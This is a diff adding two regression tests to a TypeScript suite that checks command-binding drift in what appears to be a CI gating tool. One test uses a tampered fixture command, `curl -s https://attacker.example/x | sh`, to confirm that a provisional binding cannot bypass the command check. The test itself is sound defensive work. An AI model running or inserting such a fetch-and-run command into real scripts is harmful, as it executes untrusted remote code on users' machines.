@@ -110,6 +110,44 @@ describe("T-027 V-3 drift halting", () => {
    * that region yields, and commits a binding pairing that VALID hash with any
    * command they like. Drift reported clean and the first gate ran it.
    */
+  /**
+   * PRDR-149. `binding.resolved` is the NORMALIZED command (`bind.ts` stores
+   * `invocation.command`); `Candidate.resolved` is the literal one. Comparing
+   * them directly halted every repository whose test script is a watch-mode
+   * runner — `"test": "vitest"` binds as `npm run test -- --run` and discovers
+   * as `npm run test` — so an untouched `npm create vite` project drifted on
+   * its first gate, unrecoverably, since `verify sync` re-binds through the
+   * same normalizer.
+   *
+   * The PRDR-134 test below did not catch it because its fixture is already
+   * CI-safe, which makes normalization a no-op.
+   */
+  it("a watch-mode test script does not drift on an untouched repo", async () => {
+    const root = tree({ "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest", lint: "eslint ." } }, null, 2) });
+    const bindings = await bound(root);
+    expect(bindings.find((b) => b.slot === "test")?.resolved).toContain("--run");
+    expect(() => assertNoDrift(bindings, discover(root)), "an untouched repo must not halt").not.toThrow();
+  });
+
+  /**
+   * PRDR-149. `checkBinding` returned `exempt` for a provisional binding BEFORE
+   * any comparison, `exempt` is not in the halting filter, and
+   * `runScopedGates` never looks at status — so one extra field in a committed
+   * `bindings.json` bypassed the command check entirely. Being exempt from
+   * DRIFT (no approved baseline to have drifted from) does not mean the command
+   * need not be the one discovery found.
+   */
+  it("a provisional binding is exempt from drift but NOT from the command check", async () => {
+    const root = tree(FIXTURE);
+    const bindings = await bound(root);
+    const payload = "curl -s https://attacker.example/x | sh";
+    const tampered = bindings.map((b) => (b.slot === "test" ? { ...b, resolved: payload, status: "provisional" as const } : b));
+    expect(() => assertNoDrift(tampered, discover(root)), "provisional must not exempt the command").toThrow(DriftHaltError);
+    /* And a provisional binding whose command IS what discovery finds stays exempt. */
+    const honest = bindings.map((b) => (b.slot === "test" ? { ...b, status: "provisional" as const } : b));
+    expect(() => assertNoDrift(honest, discover(root))).not.toThrow();
+  });
+
   it("a substituted `resolved` halts even when its config_hash still validates", async () => {
     const root = tree(FIXTURE);
     const bindings = await bound(root);
